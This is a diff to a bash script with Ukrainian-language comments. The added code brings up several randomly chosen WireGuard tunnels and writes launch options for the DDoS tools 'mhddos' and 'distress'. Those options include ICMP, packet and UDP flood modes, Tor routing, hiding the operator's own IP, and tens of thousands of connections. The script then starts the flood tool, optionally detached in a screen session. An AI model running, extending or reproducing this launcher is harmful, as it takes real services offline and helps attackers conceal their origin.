@@ -129,4 +129,37 @@ for iface in $ACTIVE_WG; do
 done
 
 #=== Підключення нових WG тунелів ===
-echo "[+] Підключення
+echo "[+] Підключення нових WG конфігів..."
+WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf | head -n 4))
+WG_IFACES=()
+for conf in "${WG_FILES[@]}"; do
+    $SUDO wg-quick up "$conf" && echo "[+] Підключено: $conf"
+    iface=$(basename "$conf" .conf)
+    WG_IFACES+=("$iface")
+    sleep 1
+done
+
+#=== Автоматичне оновлення INI з WG інтерфейсами ===
+echo "[+] Оновлення INI файлу модулем WG тунелів..."
+if [[ "$MODULE_NAME" == "mhddos" ]]; then
+    echo "--use-my-ip 0 --copies auto -t 8000 --user-id=********* --ifaces ${WG_IFACES[*]}" > "$CONFIG_FILE"
+elif [[ "$MODULE_NAME" == "distress" ]]; then
+    echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface $(IFS=,; echo "${WG_IFACES[*]}")" > "$CONFIG_FILE"
+fi
+
+ARGS=$(cat "$CONFIG_FILE")
+
+#=== Запуск модуля ===
+echo "[+] Запуск модуля..."
+if [[ $run_mode == "1" ]]; then
+    screen -dmS "$MODULE_NAME" bash -c "$MODULE $ARGS"
+elif [[ $run_mode == "2" ]]; then
+    screen -S "$MODULE_NAME" bash -c "$MODULE $ARGS"
+elif [[ $run_mode == "3" ]]; then
+    bash -c "$MODULE $ARGS"
+else
+    echo "[-] Невірний вибір режиму запуску!"
+    exit 1
+fi
+
+echo "[+] Завершено. Модуль працює!"
